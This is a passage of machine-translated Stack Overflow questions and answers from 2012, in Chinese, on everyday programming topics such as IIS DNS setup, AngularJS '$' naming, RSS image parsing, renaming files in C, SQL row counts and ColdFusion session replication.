如果可能的话，我可以用它背后的一些想法来让它工作吗？

对不起我的语言不好，我真的不知道该怎么说。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:33:44.077

Java 可用于通过蓝牙发送文件，在[http://today.java.net/pub/a/today/2004/07/27/bluetooth.html上有一个教程](http://today.java.net/pub/a/today/2004/07/27/bluetooth.html)

您可以从使用蓝牙的 Web 浏览器运行 Java 小程序，尽管它可能会出现一个警告，询问您是否要让小程序访问您计算机上的文件。然而，JavaScript 不是必需的，因为小程序可以直接在网页上运行。

# html - 网站未在 iis 7.5 中运行

> ID：12648541
> 
> 赞同：1
> 
> 时间：2012-09-28T23:23:38.670
> 
> 标签：html, iis-7.5

有点 IIS 新手，所以这里是：我正在尝试从 iis 7.5 运行一个网站：

![在 boerekneiter.com 文件夹中有一个文件 boerekneiter.htm](../Images/d848c19ce1a927eb8aa18d909510feb0.png)

boerekneiter.com 文件夹包含文件 boerekneiter.htm

html:

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>hi there</title>
</head>
<body>
this is the body
</body>
</html> 
```

不幸的是，当我访问[http://www.boerekneiter.com:8000/](http://www.boerekneiter.com:8000/)时， chrome 说：

```
Oops! Google Chrome could not find www.boerekneiter.com:8000 
```

我怎样才能解决这个问题？我需要安装额外的过滤器或组件吗？

这是我在 IIS 中拥有的唯一网站：

![在此处输入图像描述](../Images/ae7057345c8f5afa0e64a55b15897173.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:33:34.920

这不是 IIS 问题，而是 DNS 问题。

www.boerekneiter.com 只是您在 IIS 中的站点名称。如果您尚未设置 DNS 以将该域指向该服务器的 IP，您将无法通过 URL 提供服务。正如评论中提到的，您可以通过 URL localhost:8000 测试对服务器的访问，或者将“localhost”替换为服务器的 IP 地址。您还可以设置您的主机暂时将 www.boerekneiter.com 的请求定向到服务器。

# javascript - 如何为（jquery）ajax url使用相对路径

> ID：12648542
> 
> 赞同：0
> 
> 时间：2012-09-28T23:23:46.863
> 
> 标签：javascript, jquery, ajax

我有一个ajax函数：

`$.post("/ajax.php",{query:data},function(result){...`

的位置`ajax.php`在我的域的根目录中（即 site.com/ajax.php）

当用户在文件夹中（即 site.com/m/）时，会调用相同的脚本

我面临的问题是我想引用根目录。通常`/file.php`指的是主目录，而不是`file.php`.

我的请求正在发送到`http://site.com/m/ajax.php`。

有谁知道我应该怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T22:09:19.370

我最终按照@Ohgodwhy 的建议做了：

```
$.post(
        "<?php echo $_SERVER['HTTP_HOST'];?>`/ajax.php",
        {query:data},
        function(result){
        // alert(result);
        }); 
```

到目前为止，它对我有用！

# angularjs - AngularJS 及其对美元变量的使用

> ID：12648543
> 
> 赞同：131
> 
> 时间：2012-09-28T23:23:48.550
> 
> 标签：angularjs

有谁知道在 angularJS 中使用美元方法和变量的原因是否是为了指示 angularJS 在消化过程中避免检查这些值？那么，如果 angular 遇到`$scope.$value`and `$scope.value`，那么它将避免检查前者，因为它的变量名中以美元字符为前缀？

* * *

## 回答 #1

> 赞同：119
> 
> 时间：2012-11-21T16:30:56.580

这只是来自以下代码段 [http://docs.angularjs.org/tutorial/step_05的命名约定](http://docs.angularjs.org/tutorial/step_05)

> '$' 前缀命名约定
> 您可以创建自己的服务，实际上我们将在第 11 步中做到这一点。作为命名约定，Angular 的内置服务、Scope 方法和一些其他 Angular API 具有“$”前缀在名字前面。命名服务和模型时不要使用“$”前缀，以避免任何可能的命名冲突。

[http://docs.angularjs.org/guide/concepts#angular_namespace](http://docs.angularjs.org/guide/concepts#angular_namespace)

> Angular 命名空间
> 为了防止意外的名称冲突，Angular 会为可能与 $ 冲突的对象的名称添加前缀。请不要在代码中使用 $ 前缀，因为它可能会意外地与 Angular 代码发生冲突。

* * *

## 回答 #2

> 赞同：89
> 
> 时间：2012-09-29T00:09:32.393

有几次 Angular 会忽略以美元符号为前缀的变量：

1.  在下面[Schumli 的评论](https://stackoverflow.com/questions/12648543/angularjs-and-its-use-of-dollar-variables#comment19433906_12648794)中，json 过滤器不会输出它们
2.  使用`{{ }}`指令时，angular 不会显示*嵌套* `$` 变量。例如，这仅显示`visible`属性。

    ```
    <div ng-init="n = { visible: 'foo', $ignore: 'bar' };">{{ n }}</div> 
    ```

3.  此外，当在作用域对象上添加显式观察者时，对该对象带有前导美元符号的属性的更改不会触发观察者。看到[这个更新的小提琴](http://jsfiddle.net/R9Tfb/13/)。

4.  `angular.equals()` [忽略以 . 为前缀的键`$`](http://jsfiddle.net/R9Tfb/14/)。

* * *

## 回答 #3

> 赞同：32
> 
> 时间：2014-06-09T22:22:01.947

`$`前缀表示属于 Angular 核心的变量、参数、属性或方法。

源自框架内部但实际上不是 API 的一部分的对象的属性可能以`$`- 甚至`$$`- 开头，以表示**私有**方法或属性。这与`_`其他库中经常使用前缀的方式相同。

它对运行时解释代码的方式没有任何影响，尽管框架本身可能赋予它特殊的含义。基本上，这是一个命名约定，上面写着“你不应该乱用这个”。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-09-29T00:52:37.293

不完全确定，但我相信 AngularJS 内部依赖于在摘要期间操纵这些以 $ 为前缀的变量。检查这些变量意味着摘要永远不会稳定，因为它们可能在摘要的每个循环中不断变化。

不过不要引用我的话。:)

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2014-04-24T08:14:45.400

美元 ( **$** ) 符号还可以防止元素在某些指令中被迭代（或解释）。因此，例如，由于[for 循环中的 if 子句，](https://github.com/angular/angular.js/blob/master/src/ng/directive/ngRepeat.js#L420)不使用以**$**开头的属性： `ng-repeat`

```
if(collection.hasOwnProperty(key) && key.charAt(0) != '$') 
```

[有人在 angulars github 页面上](https://github.com/angular/angular.js/issues/6266)提出了有关该主题的问题

* * *

**在以$$**`shallowCopy`开头的方法属性中，由于[if 子句在迭代](https://github.com/angular/angular.js/blob/master/src/Angular.js#L900)属性时被跳过：

 **```
if (!(key.charAt(0) === '$' && key.charAt(1) === '$')) { 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2014-06-12T02:46:35.540

我一直认为`$`服务看起来像一个“S”。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2017-01-25T06:21:21.740

@MarcoS 提供了指向[https://thinkster.io/a-better-way-to-learn-angularjs/scope-vs-scope](https://thinkster.io/a-better-way-to-learn-angularjs/scope-vs-scope)的链接，它解释了 $scope 和 scope 之间的区别。我发现这很有用，添加到其他答案中的信息。

在角度指令中有一个链接和控制器。链接是具有一组固定参数的标准函数：范围、元素、属性对象。

控制器的参数由 Angular 注入器管理，不依赖于顺序。注入器通过查找以 $ 开头的参数来解析要传入的对象。

[https://thinkster.io/a-better-way-to-learn-angularjs/scope-vs-scope](https://thinkster.io/a-better-way-to-learn-angularjs/scope-vs-scope)的作者在解释上做得更好。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2014-05-27T16:24:30.373

有很大的不同，不是在变量上，而是在控制器接收的参数上。范围参数与 $scope 参数完全不同。

有关更多信息，请查看这篇有用的帖子：[http ://www.thinkster.io/angularjs/aw9kWmdnik/angularjs-scope-vs-scope](http://www.thinkster.io/angularjs/aw9kWmdnik/angularjs-scope-vs-scope)**

# android - 如何从描述标签中获取图片链接

> ID：12648546
> 
> 赞同：0
> 
> 时间：2012-09-28T23:24:10.133
> 
> 标签：android

我想从我的 rss 提要的描述标签中获取图片链接。

描述标签的格式如下：

```
<description>&lt;p&gt;&lt;a href="http://feedads.g.doubleclick.net/~a/QVSgisNFiHp7mXgpD309loKdAQo/0/da"&gt;&lt;img src="http://feedads.g.doubleclick.net/~a/QVSgisNFiHp7mXgpD309loKdAQo/0/di" border="0" ismap="true"&gt;&lt;/img&gt;&lt;/a&gt;&lt;br/&gt;
&lt;a href="http://feedads.g.doubleclick.net/~a/QVSgisNFiHp7mXgpD309loKdAQo/1/da"&gt;&lt;img src="http://feedads.g.doubleclick.net/~a/QVSgisNFiHp7mXgpD309loKdAQo/1/di" border="0" ismap="true"&gt;&lt;/img&gt;&lt;/a&gt;&lt;/p&gt;&lt;div dir="ltr" style="text-align: left;" trbidi="on"&gt;&lt;a href="http://4.bp.blogspot.com/-pogGG3n-PfM/TqoiXzjoTpI/AAAAAAAARKg/0OagMGCaddE/s1600/AA.jpg" style="font-family: Georgia, serif; font-size: 100%; font-style: normal; font-variant: normal; font-weight: normal; line-height: normal;"&gt;&lt;span style="color: cyan;"&gt;&lt;img alt="" border="0" id="BLOGGER_PHOTO_ID_5668380873371176594" src="http://4.bp.blogspot.com/-pogGG3n-PfM/TqoiXzjoTpI/AAAAAAAARKg/0OagMGCaddE/s320/AA.jpg" style="float: left; height: 320px; margin: 0px 10px 10px 0px; width: 320px;" /&gt;&lt;/span&gt;&lt;/a&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;br /&gt;09:15OTE Sport 2  Τένις ATP 250 Malaysia 1st semifinal&lt;br /&gt;&lt;br /&gt;11:05OTE Sport 3  Moto GP ARAGON FP3&lt;br /&gt;&lt;br /&gt;11:15OTE Sport 2  Τένις ATP 250 Malaysia 2nd semifinal&lt;br /&gt;&lt;br /&gt;13:00NOVASPORTS 4  Ιστιοπλοΐα ALPARI 2012: World Match Racing Tour, Γαλλία&lt;br /&gt;&lt;br /&gt;14:00OTE Sport 2  Γερμανία δεύτερη κατηγορία Μόναχο 1860-Σαντχάουζεν&lt;br /&gt;&lt;br /&gt;14:45NOVASPORTS 1  Αγγλικό Πρωτάθλημα ΑΡΣΕΝΑΛ - ΤΣΕΛΣΙ&lt;br /&gt;&lt;br /&gt;14:50OTE Sport 3  Moto GP ARAGON QUAL&lt;br /&gt;&lt;br /&gt;15:00EUROSPORT  Ποδόσφαιρο: Παγκόσμιο Γυναικών U-17 Φάση ομίλων: Γκάμπια - Γαλλία&lt;br /&gt;&lt;br /&gt;16:00NOVASPORTS 3  Φιλικός αγώνας μπάσκετ ΟΛΥΜΠΙΑΚΟΣ - ΛΟΚΟΜΟΤΙΒ ΚΟΥΜΠΑΝ&lt;br /&gt;&lt;br /&gt;16:30OTE Sport 1  Γερμανικό Πρωτάθλημα Βέρντερ-Μπάγερν&lt;br /&gt;&lt;br /&gt;17:00OTE Sport 3  Football League Παναιτωλικός-Καλλονή&lt;br /&gt;&lt;br /&gt;17:00OTE Sport 2  Ισπανικό Πρωτάθλημα Βαλένθια-Σαραγόσα&lt;br /&gt;&lt;br /&gt;17:00EUROSPORT  Ποδηλασία Γύρος της Λομβαρδίας&lt;br /&gt;&lt;br /&gt;17:15NOVASPORTS 1  Σούπερ Λίγκα ΠΑΝΙΩΝΙΟΣ - ΑΕΚ&lt;br /&gt;&lt;br /&gt;17:15NOVASPORTS 2  Σούπερ Λίγκα ΚΕΡΚΥΡΑ - ΟΦΗ&lt;br /&gt;&lt;br /&gt;18:15EUROSPORT  Ποδόσφαιρο: Παγκόσμιο Γυναικών U-17 Φάση ομίλων: Καναδάς- Αζερμπαϊτζάν&lt;br /&gt;&lt;br /&gt;19:00OTE Sport 1  Ισπανικό Πρωτάθλημα Μάλαγα-Μπέτις&lt;br /&gt;&lt;br /&gt;19:00OTE Sport 2  Ιταλικό Πρωτάθλημα Πάρμα-Μίλαν&lt;br /&gt;&lt;br /&gt;19:00NOVASPORTS 3  Φιλικός αγώνας μπάσκετ ΤΣΣΚΑ ΜΟΣΧΑΣ - ΖΑΛΓΚΙΡΙΣ ΚΑΟΥΝΑΣ&lt;br /&gt;&lt;br /&gt;19:00Sport TV  Βελγικό πρωτάθλημα ΖΟΥΛΤΕ ΒΑΡΕΓΚΕΜ-ΑΝΤΕΡΛΕΧΤ&lt;br /&gt;&lt;br /&gt;19:30OTE Sport 3  Γερμανικό Πρωτάθλημα Ντόρτμουντ-Γκλάντμπαχ&lt;br /&gt;&lt;br /&gt;19:30NOVASPORTS 2  Σούπερ Λίγκα ΑΤΡΟΜΗΤΟΣ - ΟΛΥΜΠΙΑΚΟΣ&lt;br /&gt;&lt;br /&gt;19:30NOVASPORTS 1  Αγγλικό Πρωτάθλημα ΜΑΝΤΣΕΣΤΕΡ Γ. - ΤΟΤΕΝΑΜ&lt;br /&gt;&lt;br /&gt;21:00OTE Sport 1  Ισπανικό Πρωτάθλημα Σοσιεδάδ-Αθλέτικ Μπιλμπάο&lt;br /&gt;&lt;br /&gt;21:45OTE Sport 2  Ιταλικό Πρωτάθλημα Γιουβέντους-Ρόμα&lt;br /&gt;&lt;br /&gt;22:30NOVASPORTS 2  Πορτογαλικό Πρωτάθλημα ΡΙΟ ΑΒΕ - ΠΟΡΤΟ&lt;br /&gt;&lt;br /&gt;23:00OTE Sport 1  Ισπανικό Πρωτάθλημα Σεβίλη-Μπαρτσελόνα &lt;/div&gt;&lt;br /&gt;&lt;object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="https://active.macromedia.com/flash/cabs/swflash.cab#version=3,0,0,11" height="87" width="690"&gt;&lt;param name="Movie" value="http://network.clickbanner.gr/42/13418/13028/"&gt;&lt;param name="quality" value="high"&gt;&lt;param name="Loop" value="true"&gt;&lt;param name="play" value="true"&gt;&lt;param name="allowScriptAccess" value="sameDomain"&gt;&lt;param name="FlashVars" value="clickTAG=http://network.clickbanner.gr/z/13028/CD13418/"&gt;&lt;param name="bgcolor" value="#FFFFFF"&gt;&lt;embed src="http://network.clickbanner.gr/42/13418/13028/" flashvars="clickTAG=http://network.clickbanner.gr/z/13028/CD13418/" quality="high" bgcolor="#FFFFFF" name="Banner" allowscriptaccess="sameDomain" type="application/x-shockwave-flash" pluginspage="https://www.macromedia.com/go/getflashplayer" align="middle" height="87" width="679"&gt;&lt;/embed&gt;&lt;/object&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href="http://network.clickbanner.gr/z/12699/CD13418/" target="_blank"&gt;&lt;img alt="" border="0" src="http://network.clickbanner.gr/42/13418/12699/" style="height: 82px; margin: 0 10px 10px 0; width: 674px;" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class="blogger-post-footer"&gt;&lt;img width='1' height='1' src='https://blogger.googleusercontent.com/tracker/4261359698446466108-6623338655004558006?l=olympiacos-blog.blogspot.com' alt='' /&gt;&lt;/div&gt;&lt;img src="http://feeds.feedburner.com/~r/olympiacos-blogspot/xJVek/~4/I0JP9iZXKTc" height="1" width="1"/&gt;</description><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://4.bp.blogspot.com/-pogGG3n-PfM/TqoiXzjoTpI/AAAAAAAARKg/0OagMGCaddE/s72-c/AA.jpg" height="72" width="72" /> 
```

我想得到

`http://4.bp.blogspot.com/-pogGG3n-PfM/TqoiXzjoTpI/AAAAAAAARKg/0OagMGCaddE/s1600/AA.jpg`

我尝试的方式是

```
 if (description.contains("div class=\"seperator\" ")){
                String imgg  = description.substring(description.indexOf("div class=\"seperator\""));
                String cleanUp = imgg.substring(0, imgg.indexOf(">")+1);//deixnei apo pou ksekina to keimeno
                imgg = imgg.substring(imgg.indexOf("a href=") + 5);
                int indexOf = imgg.indexOf("\"");
                if (indexOf==-1){
                    indexOf = imgg.indexOf("\"");
                }
                imgg = imgg.substring(0, indexOf);

                setImgLink(imgg);
            this.description = this.description.replace(cleanUp, "");
        }   else{   .... 
```

但我总是得到 else 声明。请问我该如何解决？

谢谢你的时间

@juan 我可以使用这样的东西吗？

```
DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();
builderFactory.setNamespaceAware(true);
DocumentBuilder builder = builderFactory.newDocumentBuilder();
Document document = builder.parse(description);

XPath xpath = XPathFactory.newInstance().newXPath();
String expression = "//img";
Node imgNode = (Node) xpath.evaluate(expression, document, XPathConstants.NODE);

String imgg = imgNode.getAttribute("src"); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:35:40.727

这可能不是您唯一的问题，但

```
"class=\"seperator\" " 
```

有错字，应该是

```
"class=\"separator\" " 
```

此外，除非您完全控制 XML，否则使用 Regexp 解析 XML 是很脆弱的。即便如此，您最好还是使用 XML 解析器/XPath

您拥有的 XPath 将检索文档中的第一个图像，您确定这就是您想要的吗？你可能应该使用更像

```
//div[@class='separator']/img 
```

要从返回的属性中获取属性`Node`，请使用

```
 imgNode.getAttributes().getNamedItem("src").getNodeValue() 
```

# sublimetext2 - 无论如何在 sublime text2 中做类似 ilike 的事情吗？

> ID：12648547
> 
> 赞同：0
> 
> 时间：2012-09-28T23:24:11.180
> 
> 标签：sublimetext2

所以在 Sublime Text 2 中，我可以使用 control+shift+h 在所有文件中查找某些内容，这非常有用，但有时我有点知道我需要查找什么，但我不知道它的确切名称，所以我认为如果我能做这样的事情会很有帮助：

```
Select * From table
WHERE colname ilike '%function%email%' 
```

我怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T17:25:46.177

从你的问题中你想要什么并不完全清楚。

您可以通过右键单击侧栏中的文件夹来搜索多个文件的正则表达式。更多信息[http://opensourcehacker.com/2012/05/11/sublime-text-2-tips-for-python-and-web-developers/#Searching_multiple_files](http://opensourcehacker.com/2012/05/11/sublime-text-2-tips-for-python-and-web-developers/#Searching_multiple_files)

您可以通过键入文件名和函数名的第一个字母（在 OSX 上为 CMD+T）来执行“转到任何地方”自动完成功能。更多信息 [http://opensourcehacker.com/2012/05/11/sublime-text-2-tips-for-python-and-web-developers/#Go_to_anywhere_shortcut](http://opensourcehacker.com/2012/05/11/sublime-text-2-tips-for-python-and-web-developers/#Go_to_anywhere_shortcut)

您可以使用 CMD+R OSX 浏览当前文件中的函数。

您可以根据您的编程语言使用 SublimeCodeintel 增强自动完成功能：

[https://github.com/Kronuz/SublimeCodeIntel](https://github.com/Kronuz/SublimeCodeIntel)

# android - Android 套接字和 HTTP 响应标头

> ID：12648551
> 
> 赞同：3
> 
> 时间：2012-09-28T23:24:39.567
> 
> 标签：android, http, sockets, http-headers, response

有趣的是：我可能不小心找到了解决方案[是否可以使用普通套接字连接发送 HTTP 请求并接收没有标头的响应？](https://stackoverflow.com/questions/8320574/). 我希望我忽略了一些东西。

无论如何，我正在连接到 Web 服务器，发送 HTTP 请求，接收响应并关闭连接。实际的 HTTP 会话（服务器端的 tcpdump）如下所示：

```
GET /blah.php?param1=test1t&param2=test2 HTTP/1.0

HTTP/1.1 200 OK
Date: Sat, 22 Sep 2012 10:16:46 GMT
Server: Apache/2.2.17 (Ubuntu)
X-Powered-By: PHP/5.3.5-1ubuntu7.8
Vary: Accept-Encoding
Content-Length: 17
Connection: close
Content-Type: text/html

<pre>173364</pre> 
```

凉爽的。它工作......到目前为止。现在这是代码。字符串 szRetval 仅包含“<pre>173364</pre>”。

```
Socket s = new Socket("1.2.3.4", 80);
//DataInputStream in = new DataInputStream(s.getInputStream());
BufferedReader bin = new BufferedReader(new InputStreamReader(s.getInputStream()));
DataOutputStream out = new DataOutputStream(s.getOutputStream());

out.writeBytes(szRequest);
String szRetval = "";
String szLine = "";
while((szLine=bin.readLine())!=null) {
    szRetval += szLine;
}
s.close();
return szRetval; 
```

从代码示例中可以看出，我已经从 DataInputStream 切换到了 BufferedReader。没有区别，所以我想这与 Socket 类本身有关。

为什么o为什么（原始）套接字不返回http响应标头？

Android 2.3.3，AsyncTask 中的网络 I/O，不使用代理。

# c - 如何在C中重命名文件名

> ID：12648563
> 
> 赞同：2
> 
> 时间：2012-09-28T23:25:37.523
> 
> 标签：c

我写了这段代码，列出了当前目录下的所有 JPG 文件，

```
#include <string.h>
#include <stdio.h>
#include <dirent.h> 
int main() {
    char *ptrToSubString;
    char fileName[100];
    DIR *dir;
    struct dirent *ent;
    dir = opendir(".");
    if (dir != NULL) {
            while((ent = readdir(dir)) != NULL) {
                   strcpy(fileName,ent->d_name);
                   ptrToSubString = strstr(fileName,".jpg");
                   if (ptrToSubString != NULL) {
                       printf("%s",ent->d_name);
                   } else {
                      continue;
                   }
            }
            closedir(dir);
    } else {
            perror("");
            return 5;
 }
return 0;
} 
```

但我想添加将文件重命名为唯一文件名的功能，或将唯一标识符附加到文件名。

例如，如果程序列出以下文件名：

*   facebook.png
*   instagram.png
*   推特.png

我想让他们重命名为

*   facebook-a0b1c2.png
*   instagram-d3e4f5.png
*   推特-a6b7c9.png

关于如何实现这一目标的任何想法？任何帮助将不胜感激！谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:31:41.673

拆分名称：

```
*(ptrToSubString++) = 0x0; 
```

然后重新组合名称，添加一个随机的十六进制序列（或者可能是一个计数器？）

```
snprintf(newFilename, SIZE_OF_NEWFILENAME_BUFFER,
     "%s-%06x.%s", fileName, rndhex, ptrToSubString); 
```

调用`rename()`新文件。

**更新**

正如 Zack 所注意到的，如果新文件存在，重命名将不会失败，所以在生成之后`newFilename`，要么`stat`（*注意竞争条件——参见 Zack 的其他评论*）要么`open(newFilename, O_WRONLY|O_CREAT|O_EXCL, 0600)`必须用于验证新名称未在使用中。如果是，则生成一个新的随机数并重复。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:32:41.773

好吧，在 中`rename`找到了一个功能`stdio.h`。你可以像这样使用它：

```
/* rename example */
#include <stdio.h>

int main (){
    int result;
    char oldname[] ="oldname.txt";
    char newname[] ="newname.txt";
    result= rename( oldname , newname );
    if ( result == 0 )
        puts ( "File successfully renamed" );
    else
        perror( "Error renaming file" );
    return 0;
} 
```

只需根据您的需要进行调整。你也可以在[这里阅读更多内容。](http://www.cplusplus.com/reference/clibrary/cstdio/rename/)

# iphone - 从图像中解析数据？

> ID：12648564
> 
> 赞同：0
> 
> 时间：2012-09-28T23:25:56.440
> 
> 标签：iphone, ios, xcode, cocoa-touch, ipad

> **可能重复：**
> [iphone：除了 ABBY 之外的名片阅读器 sdk](https://stackoverflow.com/questions/8865621/iphone-business-card-reader-sdk-apart-from-abby)

我想知道如何在 iOS 中解析图像以从中获取数据？例如，假设用户要为名片拍照，我如何将逻辑添加到程序中以在用户将照片居中显示在显示的红色框中时自动拍照？有什么方法可以阅读名片上的内容并将其转换为文本吗？

一个简单的谷歌搜索没有发现任何东西。

# sql - 如何通过一次查询获取数据库中的总行数

> ID：12648565
> 
> 赞同：1
> 
> 时间：2012-09-28T23:26:02.330
> 
> 标签：sql, sqlite, rows

我有一个包含两个表的数据库，我想通过单个查询获取这些表中的总行数。到目前为止，T 尝试过：

```
SELECT (count(bill.*) + count(items.*)) as TTL FROM bill, items // Failed 
SELECT count(*) as TTL FROM bill, items // wrong total
SELECT (count(bill.ID_B) + count(items.ID_I)) as TTL FROM bill, items // wrong total
SELECT count(bill.ID_B + items.ID_I) as TTL FROM bill, items // return the biggest total 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:29:22.410

使用两个子查询：

```
select (select count(1) from bill) + (select count(1) from items); 
```

# jakarta-ee - ColdFusion 9 多服务器设置：设置应用程序名称可防止会话复制

> ID：12648568
> 
> 赞同：2
> 
> 时间：2012-09-28T23:26:26.827
> 
> 标签：jakarta-ee, coldfusion, jvm, coldfusion-9, jrun

所以，标题几乎说明了一切：我正在从单服务器 ColdFusion 安装切换到多服务器 ColdFusion 安装，如果我设置应用程序名称，会话复制将不起作用。

这是一个没有成功复制会话的精简 application.cfc。

```
 component 
    {
        this.name                = 'myTestApp';
        this.sessionManagement   = true;
        this.sessionTimeout      = createTimeSpan(0,2,0,0);
    } 
```

只要我注释掉应用程序名称，会话复制就可以在我的服务器之间完美运行。

我相信[这个 Adob​​e 帮助页面](http://help.adobe.com/en_US/ColdFusion/9.0/Developing/WSc3ff6d0ea77859461172e0811cbec22c24-786c.html#WSc3ff6d0ea77859461172e0811cbec14231-7fdf)切线地引用了这个问题：

> 如果您未在 Application.cfc 初始化代码中的 This.name 变量中或使用 ColdFusion cfapplication 标记指定应用程序名称，则应用程序未命名，并且应用程序范围对应于 ColdFusion J2EE servlet 上下文。因此，ColdFusion 仅支持一个未命名的应用程序。
> 
> 如果多个 cfapplication 标记和 Application.cfc 文件未指定应用程序名称，则这些应用程序中的所有页面共享 servlet 上下文作为它们的应用程序范围。未命名应用程序的所有会话都直接对应于 J2EE 应用程序服务器的会话对象。（如果您不使用 J2EE 会话变量，ColdFusion 会确保 J2EE 会话的持续时间至少与会话超时时间一样长。）"

显然，停止使用`application.name`. 但是，如何让我的服务器在使用命名应用程序时使会话可用？有没有办法在 J2EE/JRun servlet 上下文中注册应用程序名称？我不想为我们在服务器上运行的每个 CF 应用程序设置一个单独的实例集群；这似乎不是一个可扩展的解决方案。

我觉得我可能在这里遗漏了一些非常简单的东西，不是 Java 大师，但任何提示都值得赞赏。--Will

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-01T14:01:07.277

我们已经使用 ColdFusion (J2EE) 集群配置了许多集群，并让 Session Replication 可靠地运行，并且始终使用定义的 ColdFusion 应用程序。毫无疑问，在 6.1 到 8 版本中，这是非常具有挑战性的，CF9 肯定会变得更好。然而，ColdFusion 聚类并不是一个简单的点击操作，它需要小心地创建；从在所有服务器上创建多个实例开始；此时检查以确保每个实例都按预期单独提供内容；然后我们可以创建集群添加成员（最近创建和测试的实例）。

我们的建议是使用“粘性会话”设置“循环”，但是我们已经成功地使客户端只能使用循环。在此过程的每个阶段，每次进行更改或添加时重新启动所有实例非常重要，并且`{instance}-out.log`应在每次重新启动后检查以确保没有与集群相关的错误，正如 Barney 在此线程中所说的那样。只有在`{instance}-out.log`'s 中没有集群错误时，集群才能正常工作，并且在集群完全配置之前不要做出任何判断或假设。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T08:31:14.857

这里有一些想法：

*   您是否在两个 CF 实例上都启用了 J2EE 会话？
*   您的 CF 服务器是否都在完全相同的 CF 和 JRun 版本上？
*   他们是否运行相同版本的 Java？

JRun 或 Coldfusion 的日志中是否显示任何内容？

我希望如果会话无法复制，那么您会在日志中看到它的提及。由于可靠性问题（主要是集群成员数量众多），我们放弃了 JRun/CF 中的会话复制，但我们确实让它运行在具有应用程序名称的应用程序上，所以我知道这是可能的。

# java - 自定义日历应填满屏幕

> ID：12648572
> 
> 赞同：0
> 
> 时间：2012-09-28T23:27:17.887
> 
> 标签：java, android, calendar

我在我的应用程序中使用[这个自定义日历](http://w2davids.wordpress.com/android-simple-calendar/)。我希望日历日期应该填满整个屏幕，而不是包装内容，这使得应用程序在底部有很多空白。如何让日历填满屏幕底部（当月有 4 或 5 周时相应调整）？

这是**XML**：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@drawable/bg">

    <ImageView
        android:id="@+id/calendarToJournalButton"
        android:src="@drawable/add_entry_button_selector"
        android:gravity="left"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:paddingBottom="10dip">
    </ImageView>

    <Button
        android:id="@+id/selectedDayMonthYear"
        android:textColor="#FFFFFF"
        android:layout_gravity="center"
        android:textAppearance="?android:attr/textAppearanceMedium"
        android:background="@drawable/calendar_top_header"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content">
    </Button>

    <LinearLayout
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:orientation="horizontal"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content">

        <ImageView
            android:id="@+id/prevMonth"
            android:src="@drawable/calendar_left_arrow_selector"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content">
        </ImageView>
        <Button
            android:id="@+id/currentMonth"
            android:layout_weight="0.6"
            android:textColor="#FFFFFF"
            android:textAppearance="?android:attr/textAppearanceMedium"
            android:background="@drawable/calendar_bar"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content">
        </Button>
        <ImageView
            android:id="@+id/nextMonth"
            android:src="@drawable/calendar_right_arrow_selector"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content">
        </ImageView>
    </LinearLayout>

    <LinearLayout
        android:layout_gravity="center"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content">
        <ImageView
            android:id="@+id/calendarheader"
            android:src="@drawable/blue_bg_with_text"
            android:layout_gravity="center"
            android:layout_width="fill_parent"
            android:layout_height="wrap_content">
        </ImageView>
    </LinearLayout>

    <GridView
        android:id="@+id/calendar"
        android:numColumns="7"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content">
    </GridView>

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T22:19:44.110

这对我有用：

```
public int ROW_NUMBER = 5;

public View getView(int position, View convertView, ViewGroup parent)
{
 AbsListView.LayoutParams param = new AbsListView.LayoutParams(
                        android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                        gridview.getHeight()/ROW_NUMBER);
 convertView.setLayoutParams(param);

} 
```

# actionscript-3 - as3 addEventListener - 在函数中传递变量？

> ID：12648578
> 
> 赞同：1
> 
> 时间：2012-09-28T23:28:25.380
> 
> 标签：actionscript-3, flash, addeventlistener

是否可以在 addEventListener 的末尾传递一个 var？

```
/// clickType declared elsewhere in code.
checkBoxFast.addEventListener(clickType, goFast("yes"));

function goFast(evt:Event=null,myVar:String)
{
trace(myVar);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T05:13:21.990

我想如果你想参数化你的事件处理我会建议将变量传递给事件。

- 创建自定义事件：

```
public class MyEvent extends Event {
    public var myVar:String;

